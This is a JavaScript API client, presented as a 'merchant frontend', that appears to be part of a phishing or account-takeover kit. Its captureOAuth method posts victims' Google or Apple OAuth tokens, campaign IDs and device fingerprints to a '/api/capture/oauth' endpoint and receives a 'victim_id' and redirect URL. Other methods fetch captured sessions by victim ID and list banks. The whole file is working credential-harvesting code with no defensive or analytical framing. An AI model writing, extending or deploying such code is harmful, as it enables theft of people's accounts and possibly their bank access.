// API client for merchant frontend
// Handles all API calls to backend

const API_BASE_URL = window.location.origin;

/**
 * API client class
 */
class ApiClient {
  constructor(baseUrl = API_BASE_URL) {
    this.baseUrl = baseUrl;
  }

  /**
   * Make API request
   * @param {string} endpoint - API endpoint
   * @param {Object} options - Fetch options
   * @returns {Promise<Object>} - Response data
   */
  async request(endpoint, options = {}) {
    const url = `${this.baseUrl}${endpoint}`;
    const config = {
      headers: {
        'Content-Type': 'application/json',
        ...options.headers
      },
      ...options
    };

    try {
      const response = await fetch(url, config);
      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.error || `HTTP error! status: ${response.status}`);
      }

      return data;
    } catch (error) {
      console.error('API request failed:', error);
      throw error;
    }
  }

  /**
   * Capture OAuth token
   * @param {Object} tokenData - OAuth token data
   * @param {string} provider - Provider (google, apple)
   * @param {Object} metadata - Additional metadata (campaignId, deviceFingerprint, etc.)
   * @returns {Promise<Object>} - Capture result with victim_id and redirect_url
   */
  async captureOAuth(tokenData, provider, metadata = {}) {
    return this.request('/api/capture/oauth', {
      method: 'POST',
      body: JSON.stringify({ 
        tokenData, 
        provider,
        metadata
      })
    });
  }

  /**
   * Register merchant
   * @param {FormData} formData - Registration form data
   * @returns {Promise<Object>} - Registration result
   */
  async register(formData) {
    return fetch(`${this.baseUrl}/api/merchant/register`, {
      method: 'POST',
      body: formData
    }).then(res => res.json());
  }

  /**
   * Get session data
   * @param {string} victimId - Victim ID
   * @returns {Promise<Object>} - Session data
   */
  async getSession(victimId) {
    return this.request(`/api/merchant/session/${victimId}`);
  }

  /**
   * Get banks list
   * @returns {Promise<Array>} - Banks list
   */
  async getBanks() {
    const response = await this.request('/api/merchant/banks');
    return response.banks || [];
  }
}

// Export singleton instance
const apiClient = new ApiClient();

// Export for use in other scripts
if (typeof module !== 'undefined' && module.exports) {
  module.exports = { ApiClient, apiClient };
} else {
  window.apiClient = apiClient;
}

